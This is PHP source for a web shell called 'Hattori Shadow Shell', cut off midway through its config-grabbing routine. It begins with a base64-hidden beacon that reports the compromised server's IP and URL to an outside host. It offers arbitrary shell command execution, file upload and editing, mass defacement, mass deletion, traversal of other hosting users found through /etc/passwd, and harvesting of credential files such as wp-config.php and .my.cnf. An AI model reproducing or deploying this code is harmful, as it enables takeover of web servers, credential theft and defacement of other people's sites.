<?php
function GetIP(){
    if(getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
        $ip = getenv("HTTP_X_FORWARDED_FOR");
        if (strstr($ip, ',')) {
            $tmp = explode (',', $ip);
            $ip = trim($tmp[0]);
        }
    } else {
        $ip = getenv("REMOTE_ADDR");
    } 
    return $ip;
}

$x = base64_decode('aHR0cDovL2J5cjAwdC5jby9sLQ==').GetIP().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
if(function_exists('curl_init'))
{
    $ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
    if($gitt == false){
        @$gitt = file_get_contents($x);
    } 
}elseif(function_exists('file_get_contents')){
    @$gitt = file_get_contents($x);
}
?><?php

session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

/* Configurasi */
$aupas 			= "30fe41c10263e5c4f247c4dd2dc2278c";// HSS
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';
date_default_timezone_set("Asia/Manila");
function login_shell(){
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="theme-color" content="#343a40"/>
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="Hattori Shadow Shell"/>
		<title>Hattori Shadow Shell</title>
		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/HSS.png"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
	</head>
	<body class="bg-dark text-center text-light">
		<div class="container text-center mt-3">
			<h1>Hattori Shadow Shell </h1>
			<h5>Hattori Hanzo, The Greatest Ninja (1542 ~ 1596)</h5><hr/>
			<p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> Please Login</p>
			<form method="post">
				<div class="form-group input-group">
					<div class="input-group-prepend">
						<div class="input-group-text"><i class="fa fa-user"></i></div>
					</div>
					<input type="password" name="pass" placeholder="Password" class="form-control">
				</div>
				<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
			</form>
		</div>
		<a href="" class="text-muted fixed-bottom mb-3">Copyright 2022 @ { Hattori Shadow Shell }</a>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
	if(isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)){
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	}else{
		login_shell();
	}
}
/*
	* Akhir Login
	*
	* tool Download
*/
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['tool'] == 'download')){
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function w($dir,$perm){
	if(!is_writable($dir)){
		return "<font color='red'>".$perm."</font>";
	}else{
		return "<font color='lime'>".$perm."</font>";
	}
}
function r($dir,$perm){
	if(!is_readable($dir)){
		return "<font color=red>".$perm."</font>";
	}else{
		return "<font color=lime>".$perm."</font>";
	}
}

function exe($cmd){
	if(function_exists('system')){
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}elseif(function_exists('exec')){
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		} return $buff;
	}elseif(function_exists('passthru')){
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000){
		// Socket
		$info = 's';
	}elseif (($perms & 0xA000) == 0xA000){
		// Symbolic Link
		$info = 'l';
	}elseif (($perms & 0x8000) == 0x8000){
		// Regular
		$info = '-';
	}elseif (($perms & 0x6000) == 0x6000){
		// Block special
		$info = 'b';
	}elseif (($perms & 0x4000) == 0x4000){
		// Directory
		$info = 'd';
	}elseif (($perms & 0x2000) == 0x2000){
		// Character special
		$info = 'c';
	}elseif (($perms & 0x1000) == 0x1000){
		// FIFO pipe
	$info = 'p';
	}else{
		// Unknown
		$info = 'u';
	}
	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
		
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
if(isset($_GET['dir'])){
	$dir = $_GET['dir'];
	chdir($dir);
}else{
	$dir = getcwd();
}
	
$os = php_uname();
$ip = getHostByName(getHostName());
$ver = phpversion();
$web = $_SERVER['HTTP_HOST'];
$sof = $_SERVER['SERVER_SOFTWARE']; 
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$mysql = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$mail = (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$total = disk_total_space($dir);
$free = disk_free_space($dir);
$pers =  (int) ($free/$total*100);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<a href='?dir=$dir&tool=disabfunc' class='ds'>$ds</a>" : "<a href='?dir=$dir&tool=disabfunc'><font color=green>NONE</font></a>";
$imgfol = "<img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img>";
$imgfile = "<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img>";
function formatSize( $bytes ){
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
	return( round( $bytes, 2 )." ".$types[$i] );
}
function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}
$d0mains = @file("/etc/named.conf", false);
if (!$d0mains){
	$dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
	$GLOBALS["need_to_update_header"] = "true";
}else{ 
	$count = 0;
	foreach ($d0mains as $d0main){
		if (@strstr($d0main, "zone")){
			preg_match_all('#zone "(.*)"#', $d0main, $domains);
			flush();
			if (strlen(trim($domains[1][0])) > 2){
				flush();
				$count++;
			}
		}
	}
	$dom = "$count Domain";
}
function swall($swa,$text,$dir){
	echo "<script>Swal.fire({
		title: '$swa',
		text: '$text',
		type: '$swa',
	}).then((value) => {window.location='?dir=$dir';})</script>";
}
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ Hattori Shadow Shell }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ Hattori Shadow Shell } SHELL NAME WAS DECIDED TO BY CYBER FROST.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2022 { Hattori Shadow Shell }</small>
		</div>
	</div><br/>';
	exit;
}
function toolUpload($dir){
	echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
		<div class="card">
			<div class="card-body form-group">
				<p class="text-muted">//Multiple Upload</p>
				<div class="custom-file">
					<input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
					<label class="custom-file-label" for="customFile">Choose file</label>
				</div>
				<input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
			</div>
		</div>
	</form>';
	if(isset($_POST['upload'])){
		$jumlah = count($_FILES['file']['name']);
		for($i=0;$i<$jumlah;$i++){
			$filename = $_FILES['file']['name'][$i];
				$up = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
		}
		if($jumlah < 2){
			if($up){
				$swa = "success";
				$text = "Successfully Upload $filename";
				swall($swa,$text,$dir);
			}else{
				$swa = "Error";
				$text = "Failed Upload File";
				swall($swa,$text,$dir);
			}
		}else{
			$swa = "Success";
			$text = "Successfully Upload $jumlah File";
			swall($swa,$text,$dir);
		}
	}
}
function chmodFile($dir,$file,$nfile){
	echo "<form method='POST'>
		<h5>Chmod File : $nfile </h5>
		<div class='form-group input-group'>
			<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
			<input type='submit' class='btn btn-danger form-control' value='Chmod'>
		</div>
	</form>";
	if(isset($_POST['perm'])){
		if(exe("chmod ".$_POST['perm'].' '.$_GET['file'])){
			echo '<font color="lime">Change Permission Successfully</font><br/>';
		}else{
			echo '<font color="white">Change Permission Failed</font><br/>';
		}
	}
	exit;
}
function NewFile($dir,$imgfile){
	echo "<h4>$imgfile New File :</h4>
	<form method='POST'>
		<div class='input-group'>
			<input type='text' class='form-control' name='nama_file[]' placeholder='File Name'>
			<div class='input-group-prepend'>
				<div class='input-group-text'><a id='add_input'><i class='fa fa-plus'></i></a></div>
			</div>
		</div><br/>
		<div id='output'></div>
		<textarea name='isi_file' class='form-control' rows='13' placeholder='File Content'></textarea><br/>
		<input type='submit' class='btn btn-info btn-block' name='bikin' value='Save'>
	</form>";
	if (isset($_POST['bikin'])){
		$name = $_POST['nama_file'];
		$isi_file = $_POST['isi_file'];
		foreach ($name as $nama_file){
			$handle = @fopen("$nama_file", "w");
			if($isi_file){
				$New = @fwrite($handle, $isi_file);
			}else{
				$New = $handle;
			}
		}
		if ($New){
			$swa = "Success";
			$text = "Successfully Add File";
			swall($swa,$text,$dir);
		}else{
			$swa = "Error";
			$text = "Successfully Add File";
			swall($swa,$text,$dir);
		}
	}
}
function view($dir,$file,$nfile,$imgfile){
	echo '[ <a href="?dir='.$dir.'&tool=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&tool=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&tool=hapusf&file='.$file.'">Delete</a> ]
	<h5>'.$imgfile.' View File : '.$nfile.'</h5>
	<textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
}
function editFile($dir,$file,$nfile,$imgfile){
	echo '[ <a href="?dir='.$dir.'&tool=view&file='.$file.'">View</a> ]  [ <a class="active" href="?dir='.$dir.'&tool=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&tool=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&tool=hapusf&file='.$file.'">Delete</a> ]';
	echo "<form method='POST'>
		<h5>$imgfile Edit File : $nfile</h5>
		<textarea rows='13' class='form-control' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
			<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
	</form>";
	if(isset($_POST['edit_file'])){
		$updt = fopen("$file", "w");
		$hasil = fwrite($updt, $_POST['isi']);
		if ($hasil){
			$swa = "Success";
			$text = "Successfully Update File";
			swall($swa,$text,$dir);
		}else{
			$swa = "Error";
			$text = "Failed Update File";
			swall($swa,$text,$dir);
		}
	}
}
function renameFile($dir,$file,$nfile,$imgfile){
	echo '[ <a href="?dir='.$dir.'&tool=view&file='.$file.'">View</a> ]  [ <a href="?dir='.$dir.'&tool=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&tool=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&tool=hapusf&file='.$file.'">Delete</a> ]';
	echo "<form method='POST'>
		<h5>$imgfile Rename File : $nfile</h5>
		<input type='text' class='form-control' name='namanew' placeholder='New Name...' value='$nfile'><br/>
		<button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Rename</button>
	</form>";
	if(isset($_POST['rename_file'])){
		$lama = $file;
		$baru = $_POST['namanew'];
		rename( $baru, $lama);
		if(file_exists($baru)){
			$swa = "success";
			$text = "Name $baru Has Been Used";
			swall($swa,$text,$dir);
		}else{
			if(rename( $lama, $baru)){
				$swa = "Success";
				$text = "Successfully Changed Name To $baru";
				swall($swa,$text,$dir);
			}else{
				$swa = "Error";
				$text = "Failed to Rename";
				swall($swa,$text,$dir);
			}
		}
	}
}
function hapusFile($dir,$file,$nfile){
	echo '[ <a href="?dir='.$dir.'&tool=view&file='.$file.'">View</a> ]  [ <a href="?dir='.$dir.'&tool=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&tool=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&tool=hapusf&file='.$file.'">Delete</a> ]';
	echo "<div class='card card-body text-center text-dark mb-4'>
		<p>Are you sure to Delete? : $nfile</p>
		<form method='POST'>
			<a class='btn btn-danger btn-block' href='?dir=$dir'>Cancel</a>
			<input type='submit' name='ya' class='btn btn-success btn-success btn-block' value='Yes'>
		</form>
	</div>";
	if ($_POST['ya']){
		if (unlink($file) OR @exe("rm -rf $file")){
			$swa = "Success";
			$text = "Successfully Delete File";
			swall($swa,$text,$dir);
		}else{
			$swa = "Error";
			$text = "Failed to Delete File";
			swall($swa,$text,$dir);
		}
	}
}
function chmodFolder($dir,$ndir){
	echo "<form method='POST'>
		<h5>Chmod Folder : $ndir </h5>
		<div class='form-group input-group'>
			<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
			<input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
		</div>
	</form>";
		if(isset($_POST['chmo'])){
		if(exe("chmod ".$_POST['perm'].' '.$_GET['dir'])){
			
			echo '<font color="lime">Change Permission Berhasil</font><br/>';
		}else{
			echo '<font color="white">Change Permission Gagal</font><br/>';
		}
	}
	exit;
}
function NewFolder($dir,$imgfol){
	echo "<h5>$imgfol New Folder :</h5>
	<form method='POST'>
		<div class='input-group'>
			<input type='text' class='form-control' name='nama_folder[]' placeholder='Nama Folder...'>
			<div class='input-group-prepend'>
				<div class='input-group-text'><a id='add_input1'><i class='fa fa-plus'></i></a></div>
			</div>
		</div><br/>
		<div id='output1'></div>
		<input type='submit' class='btn btn-info btn-block' name='New' value='New'>
	</form>";
	if (isset($_POST['New'])){
		$nama = $_POST['nama_folder'];
		foreach ($nama as $nama_folder){
			$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_folder);
			$fd = @mkdir ($folder);
		}
		if ($fd){
			$swa = "Success";
			$text = "Successfully New Folder";
			swall($swa,$text,$dir);
		}else{
			$swa = "Error";
			$text = "Failed To Create a Folder";
			swall($swa,$text,$dir);
		}
	}
}
function renameFolder($dir,$ndir,$imgfol){
	echo "[ <a href='?dir=".$dir."&tool=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=".$dir."&tool=hapus_folder'>Delete</a> ] 
	<h5>$imgfol Rename Folder : $ndir </h5>
	<form method='POST'>
		<input type='text' class='form-control' name='namanew' placeholder='Input New Name...' value='$nama'><br/>
		<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Rename</button><br/>
	</form>";
	if(isset($_POST['ganti'])){
		$baru = htmlspecialchars($_POST['namanew']);
		$ubah = rename($dir, "".dirname($dir)."/".$baru."");
		if($ubah){
			$swa = "Success";
			$text = "Successfully Changed Name";
			$dir = dirname($dir);
			swall($swa,$text,$dir);
		}else{
			$swa = "Error";
			$text = "Failed Changed Name";
			$dir = dirname($dir);
			swall($swa,$text,$dir);
		}
	}
	exit;
}
function deleteFolder($dir,$ndir){
	echo "[ <a href='?dir=".$dir."&tool=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&tool=hapus_folder' class='active'>Delete</a> ] 
	<div class='card card-body text-center text-dark mb-4'>
		<p>Are you sure to Delete? : $ndir ?</p>
		<form method='POST'>
			<a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Cancel</a>
			<input type='submit' name='ya' class='btn btn-success btn-block' value='Yes'>
		</form>
	</div><br/>";
	if ($_POST['ya']){
		if(is_dir($dir)){
			if(@rmdir($dir) OR @exe("rm -rf $dir")){
				@exe("rmdir /s /q $dir");
				$swa = "Success";
				$text = "Successfully Removed Folder";
				$dir = dirname($dir);
				swall($swa,$text,$dir);
			}else{
				$swa = "Error";
				$text = "Failed Removed Folder";
				$dir = dirname($dir);
				swall($swa,$text,$dir);
			}
		}
	}
	exit;
}
function toolMasdef($dir,$file,$imgfol,$imgfile){
	function tipe_massal($dir,$namafile,$isi_script){
		if(is_writable($dir)){
			$dira = scandir($dir);
			foreach($dira as $dirb){
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.'){
					file_put_contents($lokasi, $isi_script);
				}elseif($dirb === '..'){
					file_put_contents($lokasi, $isi_script);
				}else{
					if(is_dir($dirc)){
						if(is_writable($dirc)){
							echo "Done > $lokasi\n";
							file_put_contents($lokasi, $isi_script);
							$masdef = tipe_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function tipe_biasa($dir,$namafile,$isi_script){
		if(is_writable($dir)){
			$dira = scandir($dir);
			foreach($dira as $dirb){
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.'){
					file_put_contents($lokasi, $isi_script);
				}elseif($dirb === '..'){
					file_put_contents($lokasi, $isi_script);
				}else{
					if(is_dir($dirc)){
						if(is_writable($dirc)){
							echo "Done > $dirb/$namafile\n";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
		
	if($_POST['start']){
		echo "[ <a href='?dir=$dir'>Back</a> ]
		<textarea class='form-control' rows='13' disabled=''>";
			if($_POST['tipe'] == 'mahal'){
				tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			}elseif($_POST['tipe'] == 'murah'){
				tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			}
		echo "</textarea><br/>";
	}else{
		echo "<form method='post'>
			<div class='text-center'>
				<h5>Type :</h5>
				<input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
				<label for='toggle-on' class='butn'>Normal</label>
				<input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
				<label for='toggle-off' class='butn'>Mass</label>
			</div> 
			<h5>$imgfol Folder :</h5>
			<input type='text' name='d_dir' value='$dir' class='form-control'><br>
			<h5>$imgfile Fale Name :</h5>
			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
			<h5>$imgfile File Content :</h5>
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { HSS }'></textarea><br/>
			<input type='submit' name='start' value='Mass Deface' class='btn btn-danger btn-block'>
		</form>";
	}
	exit;
}
function toolMasdel($dir,$file,$imgfol,$imgfile){
	function hapus_massal($dir,$namafile){
		if(is_writable($dir)){
			$dira = scandir($dir);
			foreach($dira as $dirb){
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.'){
					if(file_exists("$dir/$namafile")){
						unlink("$dir/$namafile");
					}
				}elseif($dirb === '..'){
					if(file_exists("".dirname($dir)."/$namafile")){
						unlink("".dirname($dir)."/$namafile");
					}
				}else{
					if(is_dir($dirc)){
						if(is_writable($dirc)){
							if($lokasi){
								echo "$lokasi > Terhapus\n";
								unlink($lokasi);
								$massdel = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']){
		echo "[ <a href='?dir=$dir'>Back</a> ]
		<textarea class='form-control' rows='13' disabled=''>";
			hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</textarea><br/>";
	}else{
		echo "<form method='post'>
			<h5>$imgfol Lokasi :</h5>
			<input type='text' name='d_dir' value='$dir' class='form-control'><br/>
			<h5>$imgfile Nama File :</h5>
			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
			<input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control'>
	</form>";
	}
	exit;
}
function toolJump($dir,$file,$ip){
	$i = 0;
	echo "<div class='card container'>";
	if(preg_match("/hsphere/", $dir)){
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])){
			echo "<pre>";
			foreach($urls as $url){
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)){
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true){
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)){
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
							if(is_writable($url_user)){
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
			if(!$i == 0){ 
				echo "<br>Total ada $i KAMAR di $ip";
			}
			echo "</pre>";
		}else{
			echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" class="form-control">';
				$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)){
					echo $getss;
				}
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
			</form></center>';
		}
	}elseif(preg_match("/vhosts/", $dir)){
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])){
			echo "<pre>";
			foreach($urls as $url){
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true){
					if(is_readable($web_vh)){
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
						if(is_writable($web_vh)){
							$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
			if(!$i == 0){
				echo "<br>Total ada $i Kamar Di $ip";
			}
			echo "</pre>";
		}else{
			echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" class="form-control">';
				bing("ip:$ip");
				echo '</textarea><br>
				<input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
			</form></center>';
		}
	}else{
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
		while($passwd = fgets($etc)){
			if($passwd == '' || !$etc){
			echo "<font color=red>Can't read /etc/passwd</font><br/>";
			}else{
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_pro_jump){
					$user_jumping_dir = "/home/$user_pro_jump/public_html";
					if(is_readable($user_jumping_dir)){
						$i++;
						$jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)){
							$jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')){
							$domain_jump = file_get_contents("/etc/named.conf");
							if($domain_jump == ''){
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							}else{
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj){
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_pro_jump){
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						}else{
							echo "<br>";
						}
					}
				}
			}
		}
		if(!$i == 0){
			echo "<br>Total ada $i kamar di $ip";
		}
		echo "</pre>";
	}
	echo "</div><br/>";
	exit;
}
function toolConfig($dir,$file){
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("HSS_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("HSS_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_con){
			$user_config_dir = "/home/$user_con/public_html/";
			if(is_readable($user_config_dir)){
				$grab_config = array(
					"/home/$user_con/.my.cnf" => "cpanel",
					"/home/$user_con/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_con/public_html/forum/config.php" => "phpBB",
					"/home/$user_con/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_con/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_con/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_con/public_html/admin/config.php" => "OpenCart",
					"/home/$user_con/public_html/application/config/database.php" => "Ellislab",
					"/home/$user_con/public_html/vb/includes/config.php" => "Vbulletin",
					"/home/$user_con/public_html/includes/config.php" => "Vbulletin",
					"/home/$user_con/public_html/forum/includes/config.php" => "Vbulletin",
					"/home/$user_con/public_html/forums/includes/config.php" => "Vbulletin",
					"/home/$user_con/public_html/cc/includes/config.php" => "Vbulletin",
					"/home/$user_con/public_html/inc/config.php" => "MyBB",
					"/home/$user_con/public_html/includes/configure.php" => "OsCommerce",
					"/home/$user_con/public_html/shop/includes/configure.php" => "OsCommerce",
					"/home/$user_con/public_html/os/includes/configure.php" => "OsCommerce",
					"/home/$user_con/public_html/oscom/includes/configure.php" => "OsCommerce",
					"/home/$user_con/public_html/products/includes/configure.php" => "OsCommerce",
					"/home/$user_con/public_html/cart/includes/configure.php" => "OsCommerce",
					"/home/$user_con/public_html/inc/conf_global.php" => "IPB",
					"/home/$user_con/public_html/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/wp/test/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/blog/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/beta/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/portal/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/site/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/wp/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/WP/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/news/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/wordpress/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/test/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/demo/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/home/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/v1/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/v2/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/press/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/new/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/blogs/wp-config.php" => "Wordpress",
					"/home/$user_con/public_html/configuration.php" => "Joomla",
					"/home/$user_con/public_html/blog/configuration.php" => "Joomla",
					"/home/$user_con/public_html/submitticket.php" => "^WHMCS",
					"/home/$user_con/public_html/cms/configuration.php" => "Joomla",
					"/home/$user_con/public_html/beta/configuration.php" => "Joomla",
					"/home/$user_con/public_html/portal/configuration.php" => "Joomla",
					"/home/$user_con/public_html/site/configuration.php" => "Joomla",
					"/home/$user_con/public_html/main/configuration.php" => "Joomla",
					"/home/$user_con/public_html/home/configuration.php" => "Joomla",
					"/home/$user_con/public_html/demo/configuration.php" => "Joomla",
					"/home/$user_con/public_html/test/configuration.php" => "Joomla",
					"/home/$user_con/public_html/v1/configuration.php" => "Joomla",
					"/home/$user_con/public_html/v2/configuration.php" => "Joomla",
					"/home/$user_con/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_con/public_html/new/configuration.php" => "Joomla",
					"/home/$user_con/public_html/WHMCS/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/whmcs1/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Whmcs/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/WHMC/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Whmc/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/whmc/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/WHM/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Whm/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/whm/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/HOST/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Host/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/host/submitticket.php" => "WHMCS",
